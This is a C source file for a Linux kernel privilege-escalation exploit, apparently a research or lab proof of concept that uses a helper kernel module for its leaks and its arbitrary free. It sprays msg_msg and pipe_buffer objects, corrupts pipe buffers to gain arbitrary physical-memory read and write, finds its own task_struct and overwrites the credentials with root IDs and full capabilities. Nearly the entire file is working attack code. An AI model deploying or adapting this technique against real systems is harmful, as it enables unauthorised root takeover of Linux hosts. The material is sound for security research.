#include "utils.h"
#include "ulkm.h"
#include "msg_msg.h"
#include "pipe_buffer.h"
#include <sys/syscall.h>
#include <sys/mman.h>
#include <pthread.h>
#include <assert.h>
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>

#define ANON_PIPE_BUF_OPS_OFFSET 0x1648cc0

// #define DEBUG
#define RESTORE

#define TASK_STRUCT_SLAB_ORDER 3
#define TASK_STRUCT_SIZE 10496
#define TASK_STRUCT_COMM_OFFSET 3008
#define TASK_STRUCT_PID_OFFSET 2464
#define TASK_STRUCT_TGID_OFFSET 2468
#define TASK_STRUCT_REAL_CRED_OFFSET 2984
#define TASK_STRUCT_CRED_OFFSET 2992

#define CRED_UID_GID_OFFSET 8
#define CRED_SUID_SGID_OFFSET 16
#define CRED_EUID_EGID_OFFSET 24
#define CRED_FSUID_FSGID_OFFSET 32
#define CRED_CAP_INHERITABLE_OFFSET 48
#define CRED_CAP_PERMITTED_OFFSET 56
#define CRED_CAP_EFFECTIVE_OFFSET 64
#define CRED_CAP_BSET_OFFSET 72
#define CRED_CAP_AMBIENT_OFFSET 80

#define PAGE_SIZE (1<<12)

#define OBJ_PER_SLAB 42

#define MSG_SPRAYS (OBJ_PER_SLAB*40)
#define MSG_FREE (MSG_SPRAYS-2*OBJ_PER_SLAB)
#define MSG_TYPE 0x41
#define MSG_HEADER 48
#define MSG_NEXT_HEADER 8
#define __MSG_SIZE 96
#define MSG_SIZE (__MSG_SIZE-MSG_HEADER)

#define MSG_SPRAYS2 (OBJ_PER_SLAB*4)
#define MSG_TYPE2 0x42
#define __MSG_SIZE2 (4096+__MSG_SIZE)
#define MSG_SIZE2 (__MSG_SIZE2-MSG_HEADER-MSG_NEXT_HEADER)

#define PIPE_SPRAY (OBJ_PER_SLAB*4)
#define PIPE_SIZE 40
#define PIPE_CNT 1

int qids[MSG_SPRAYS];
int qids2[MSG_SPRAYS2];
size_t overlayed_id = -1;

size_t vmemmap_base;
size_t dpm_base;
size_t code_base;

size_t msg_msg;

char buffer[0x2000];
char page_content[sizeof(buffer)];
char page_content_org[sizeof(buffer)];

int pipes[PIPE_SPRAY][2];

void cleanup(void)
{
    printf("[*] cleanup\n");
    for (size_t i = 0; i < MSG_SPRAYS; ++i)
        cleanup_queue(qids[i]);
    for (size_t i = 0; i < MSG_SPRAYS2; ++i)
        if (i != overlayed_id)
            cleanup_queue_no_err(qids2[i]);
}

size_t pipe_buffer;
void stage1(void)
{
    msg *message = (msg *)buffer;
    message->mtype = MSG_TYPE;

    printf("[*] alloc msg_queue\n");
    for (size_t i = 0; i < MSG_SPRAYS; ++i)
        qids[i] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);

    printf("[*] alloc msg_msg\n");
    for (size_t i = 0; i < MSG_SPRAYS; ++i)
        send_msg(qids[i], message, MSG_SIZE, 0);

    lkm_msg_msg_leak((size_t)&msg_msg, qids[MSG_FREE], MSG_TYPE);
    printf("[+] leaked msg_msg %016zx\n", msg_msg);

    printf("[*] free msg_msg\n");
    memset(buffer, 0x41, sizeof(buffer));
    // free all all but 1 of the current slab
    //   creates all free slots on the slot except one
    //   except one because to prevent returning the partial slab to the page allocator (unlikely but may be)
    for (ssize_t i = -OBJ_PER_SLAB*2; i < OBJ_PER_SLAB; ++i)
        get_msg(qids[MSG_FREE+i], message, MSG_SIZE, 0, IPC_NOWAIT);
    for (size_t i = 0; i < PIPE_SPRAY; ++i) {
        alloc_pipes(pipes[i], O_NONBLOCK);
        resize_pipe(pipes[i][0], 2);
        write_pipe(pipes[i][1], buffer, 8);
    }
    printf("[*] reclaimed as pipe_buffer\n");
    pipe_buffer = (msg_msg & ~0xfff) + __MSG_SIZE;
    printf("[+] pipe_buffer %016zx\n", pipe_buffer);

#ifdef DEBUG
    printf("[*] pipe_buffer:\n");
    for (ssize_t i = 0; i < PIPE_SIZE+__MSG_SIZE; i += 8) {
        size_t tmp;
        lkm_read(pipe_buffer+i, (size_t)&tmp);
        printf("%016zx\n", tmp);
    }
#endif
}

size_t adjacent_pipe_buffer;
size_t vmemmap_pipe_buffer;
#ifdef RESTORE
char pipe_buffer_old_content[PIPE_SIZE];
void save_pipe_buffer_state(void)
{
    for (size_t i = 0; i < PIPE_SIZE; i += 8)
        lkm_read(pipe_buffer+i, (size_t)&pipe_buffer_old_content[i]);
    printf("[*] temporarily store pipe_buffer content\n");
}
void restore_pipe_buffer_state(void)
{
    for (size_t i = 0; i < PIPE_SIZE; i += 8)
        lkm_write(pipe_buffer+i, *(size_t *)(pipe_buffer_old_content + i));
    printf("[*] store old pipe_buffer content\n");
}
#else
void save_pipe_buffer_state(void) {}
void restore_pipe_buffer_state(void) {}
#endif

struct pipe_buffer {
    size_t page;
    unsigned int offset;
    unsigned int len;
    size_t ops;
    unsigned int flags;
    size_t private;
};

#define PHYS_TO_VMEMMAP(x) ((((x) >> 12) << 6) + vmemmap_base)
#define DPM_TO_VMEMMAP(x) PHYS_TO_VMEMMAP((x) - dpm_base)
void stage2(void)
{
    vmemmap_pipe_buffer = DPM_TO_VMEMMAP(pipe_buffer);
    save_pipe_buffer_state();

    memset(buffer, 0x42, sizeof(buffer));

    msg *message = (msg *)buffer;
    message->mtype = MSG_TYPE2;
    printf("[*] alloc queues for reclaiming invalid free\n");
    for (size_t i = 0; i < MSG_SPRAYS2; ++i)
        qids2[i] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);

    printf("[*] invalid free at %016zx\n", pipe_buffer-8);
    lkm_arb_free(pipe_buffer-8);

    printf("[*] overwrite pipe_buffer->page with %016zx\n", vmemmap_pipe_buffer);
    struct pipe_buffer *corr_pipe_buffer = (struct pipe_buffer *)(buffer + 8 + 4096 - MSG_HEADER);
    memset(corr_pipe_buffer, 0, sizeof(struct pipe_buffer));
    corr_pipe_buffer->page = vmemmap_pipe_buffer;
    corr_pipe_buffer->offset = __MSG_SIZE;
    corr_pipe_buffer->len = 8;
    corr_pipe_buffer->ops = code_base+ANON_PIPE_BUF_OPS_OFFSET;
    corr_pipe_buffer->flags = 0x10;
    for (size_t i = 0; i < MSG_SPRAYS2; ++i)
        send_msg(qids2[i], message, MSG_SIZE2, 0);

#ifdef DEBUG
    printf("[*] pipe_buffer:\n");
    for (ssize_t i = 0; i < PIPE_SIZE+__MSG_SIZE; i += 8) {
        size_t tmp;
        lkm_read(pipe_buffer+i, (size_t)&tmp);
        printf("%016zx\n", tmp);
    }
#endif
}

#define IS_VMEMMAP(x) (((x) & ~((1<<30)-1)) == vmemmap_base)
size_t page_fd = -1;
void stage3(void)
{
    size_t count = 0;
    printf("[*] find overwritten pipe_buffer\n");
    for (size_t i = 0; i < PIPE_SPRAY; ++i) {
        memset(buffer, 0, sizeof(buffer));
        read_pipe(pipes[i][0], buffer, 7);
        if (buffer[0] != 0x41) {
            buffer[7] = -1;
            count++;
            page_fd = i;
            printf("[+] found pipe_buffer fd %4zd\n", page_fd);
            if (IS_VMEMMAP(*(size_t *)(buffer))) {
                printf("[+] found page %016zx\n", *(size_t *)(buffer));
                continue;
            }
        }
    }

    if (page_fd == (size_t)-1 || count != 1) {
        printf("[!] count         %zd\n", count);
        printf("[!] page_fd       %016zx\n", page_fd);
        restore_pipe_buffer_state();
        exit(-1);
    }

    printf("[*] find msg_msg that overlays the corrupted pipe_buffer\n");
    for (size_t i = 0; i < MSG_SPRAYS2; ++i) {
        get_msg(qids2[i], buffer, MSG_SIZE2, 0, MSG_COPY|IPC_NOWAIT);
        struct pipe_buffer *corr_pipe_buffer = (struct pipe_buffer *)(buffer + 8 + 4096 - MSG_HEADER);
        if (corr_pipe_buffer->offset != __MSG_SIZE || corr_pipe_buffer->len != 8) {
            printf("[+] found overlayed msg_msg %zd\n", i);
            overlayed_id = i;
        }
    }
}

// write from the &len to &private of the next
#define PIPE_OFFSET (__MSG_SIZE+PIPE_SIZE-8)
size_t arbrw_fd = -1;
void stage4(void)
{
    memset(buffer, 0x41, sizeof(buffer));
    for (size_t i = 0; i < PIPE_SPRAY; ++i) {
        if (i == page_fd)
            continue;
        write_pipe(pipes[i][1], buffer, 8);
    }

#ifdef DEBUG
    printf("[*] pipe_buffer %016zx %016zx:\n", pipe_buffer, DPM_TO_VMEMMAP(pipe_buffer));
    for (size_t i = 0; i < PIPE_SIZE+__MSG_SIZE; i += 8) {
        size_t tmp;
        lkm_read(pipe_buffer+i, (size_t)&tmp);
        printf("%016zx\n", tmp);
    }
#endif

    memset(buffer, 0, sizeof(buffer));
    struct pipe_buffer *cor_pipe_buffer = (struct pipe_buffer *)buffer;
    struct pipe_buffer *next_cor_pipe_buffer = (struct pipe_buffer *)(buffer+__MSG_SIZE);

    cor_pipe_buffer->offset = 8+__MSG_SIZE;
    cor_pipe_buffer->len = -PIPE_OFFSET;
    cor_pipe_buffer->ops = code_base+ANON_PIPE_BUF_OPS_OFFSET;
    cor_pipe_buffer->flags = 0x10;

    next_cor_pipe_buffer->page = vmemmap_base;
    next_cor_pipe_buffer->offset = 0;
    next_cor_pipe_buffer->len = PAGE_SIZE;
    next_cor_pipe_buffer->ops = code_base+ANON_PIPE_BUF_OPS_OFFSET;
    next_cor_pipe_buffer->flags = 0x10;

    write_pipe(pipes[page_fd][1], buffer+8, PIPE_OFFSET);

#ifdef DEBUG
    printf("[*] pipe_buffer %016zx %016zx:\n", pipe_buffer, DPM_TO_VMEMMAP(pipe_buffer));
    for (size_t i = 0; i < PIPE_SIZE+__MSG_SIZE; i += 8) {
        size_t tmp;
        lkm_read(pipe_buffer+i, (size_t)&tmp);
        printf("%016zx\n", tmp);
    }
#endif

    for (size_t i = 0; i < PIPE_SPRAY; ++i) {
        if (i == page_fd)
            continue;
        memset(buffer, 0x41, sizeof(buffer));
        read_pipe(pipes[i][0], buffer, 8);
        if (buffer[1] != 0x41) {
            printf("[*] *buffer %016zx\n", *(size_t *)buffer);
            arbrw_fd = i;
            printf("[+] found pipe_buffer fd for arbrw %4zd\n", arbrw_fd);
        }
    }
    if (arbrw_fd == (size_t)-1) {
        printf("[!] arbrw_fd not found\n");
        exit(-1);
    }
}

void arbr_phys(size_t paddr, size_t *addr)
{
    memset(buffer, 0, sizeof(buffer));
    struct pipe_buffer *cor_pipe_buffer = (struct pipe_buffer *)buffer;
    struct pipe_buffer *next_cor_pipe_buffer = (struct pipe_buffer *)(buffer+__MSG_SIZE);

    cor_pipe_buffer->offset = 8+__MSG_SIZE;
    cor_pipe_buffer->len = -PIPE_OFFSET;
    cor_pipe_buffer->ops = code_base+ANON_PIPE_BUF_OPS_OFFSET;
    cor_pipe_buffer->flags = 0x10;

    next_cor_pipe_buffer->page = PHYS_TO_VMEMMAP(paddr);
    next_cor_pipe_buffer->offset = paddr % PAGE_SIZE;
    next_cor_pipe_buffer->len = PAGE_SIZE;
    next_cor_pipe_buffer->ops = code_base+ANON_PIPE_BUF_OPS_OFFSET;
    next_cor_pipe_buffer->flags = 0x10;

    write_pipe_no_err(pipes[page_fd][1], buffer+8, PIPE_OFFSET);
    read_pipe_no_err(pipes[arbrw_fd][0], (char *)addr, 8);
}

void arbw_phys(size_t paddr, size_t value)
{
    memset(buffer, 0, sizeof(buffer));
    struct pipe_buffer *cor_pipe_buffer = (struct pipe_buffer *)buffer;
    struct pipe_buffer *next_cor_pipe_buffer = (struct pipe_buffer *)(buffer+__MSG_SIZE);

    cor_pipe_buffer->offset = 8+__MSG_SIZE;
    cor_pipe_buffer->len = -PIPE_OFFSET;
    cor_pipe_buffer->ops = code_base+ANON_PIPE_BUF_OPS_OFFSET;
    cor_pipe_buffer->flags = 0x10;

    next_cor_pipe_buffer->page = PHYS_TO_VMEMMAP(paddr);
    next_cor_pipe_buffer->offset = 0;
    next_cor_pipe_buffer->len = paddr % PAGE_SIZE;
    next_cor_pipe_buffer->ops = code_base+ANON_PIPE_BUF_OPS_OFFSET;
    next_cor_pipe_buffer->flags = 0x10;

    write_pipe_no_err(pipes[page_fd][1], buffer+8, PIPE_OFFSET);
    write_pipe_no_err(pipes[arbrw_fd][1], (char *)&value, 8);
}

void stage5(void)
{
    char this_comm[256] = {0};
    int fd = open("/proc/self/comm", O_RDONLY);
    int n = read(fd, this_comm, sizeof(this_comm)-1);
    this_comm[n-1] = 0;
    unsigned int this_pid = getpid();
    unsigned int this_gtid = gettid();
    printf("[*] this process %s [%d,%d]\n", this_comm, this_pid, this_gtid);
    size_t p_current = 0;
    for (size_t pa = 0; pa < (32ULL << 30) && p_current == 0; pa += (PAGE_SIZE << TASK_STRUCT_SLAB_ORDER)) {
        for (size_t _pa = pa; _pa < pa + (PAGE_SIZE << TASK_STRUCT_SLAB_ORDER) && p_current == 0; _pa += TASK_STRUCT_SIZE) {
            char comm[9] = {0};
            size_t potential_task_struct_comm = _pa + TASK_STRUCT_COMM_OFFSET;
            // printf("[*] _pa %016zx\n", _pa);
            arbr_phys(potential_task_struct_comm, (size_t *)comm);
            if (!strncmp(comm, this_comm, 8)) {
                size_t tmp;

                unsigned int pid;
                size_t potential_task_struct_pid = _pa + TASK_STRUCT_PID_OFFSET;
                arbr_phys(potential_task_struct_pid, (size_t *)&tmp);
                pid = (unsigned int)tmp;

                unsigned int gtid;
                size_t potential_task_struct_tgid = _pa + TASK_STRUCT_TGID_OFFSET;
                arbr_phys(potential_task_struct_tgid, (size_t *)&tmp);
                gtid = (unsigned int)tmp;
                if (pid != this_pid || gtid != this_gtid) {
                    // printf("[*] same comm %s but different [%d,%d] != [%d,%d]\n", comm, pid, gtid, this_pid, this_gtid);
                    continue;
                }

                p_current = _pa;
                printf("[+] found %s [%d,%d] at %016zx\n", comm, pid, gtid, p_current+dpm_base);
            }
        }
    }

    size_t cred;
    arbr_phys(p_current+TASK_STRUCT_CRED_OFFSET, (size_t *)&cred);
    printf("[+] found cred %016zx\n", cred);
    size_t p_cred = cred-dpm_base;
    arbw_phys(p_cred+CRED_UID_GID_OFFSET, 0);
    arbw_phys(p_cred+CRED_SUID_SGID_OFFSET, 0);
    arbw_phys(p_cred+CRED_EUID_EGID_OFFSET, 0);
    arbw_phys(p_cred+CRED_FSUID_FSGID_OFFSET, 0);
    arbw_phys(p_cred+CRED_CAP_INHERITABLE_OFFSET, -1);
    arbw_phys(p_cred+CRED_CAP_PERMITTED_OFFSET, -1);
    arbw_phys(p_cred+CRED_CAP_EFFECTIVE_OFFSET, -1);
    arbw_phys(p_cred+CRED_CAP_BSET_OFFSET, -1);
    arbw_phys(p_cred+CRED_CAP_AMBIENT_OFFSET, -1);

    if (getuid() == 0 && getgid() == 0)
        printf("[+] success: uid %d gid %d\n", getuid(), getgid());
    else
        printf("[!] no success\n");
    // int ret = system("/bin/sh");
    // if (ret < 0) {
    //     perror("system");
    //     exit(-1);
    // }
}

int main(void)
{
    int ret = 0;
    pin_to_core(0);
    set_limit();
    printf("[*] start\n");
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    lkm_init();

    lkm_vmemmap_leak((size_t)&vmemmap_base);
    lkm_dpm_leak((size_t)&dpm_base);
    lkm_code_leak((size_t)&code_base);
    printf("[*] vmemmap_base %016zx\n", vmemmap_base);
    printf("[*] dpm_base     %016zx\n", dpm_base);
    printf("[*] code_base    %016zx\n", code_base);

    stage1();
    stage2();
    stage3();
    stage4();
    stage5();

    cleanup();
    restore_pipe_buffer_state();
    printf("[*] done\n");
    return ret;
}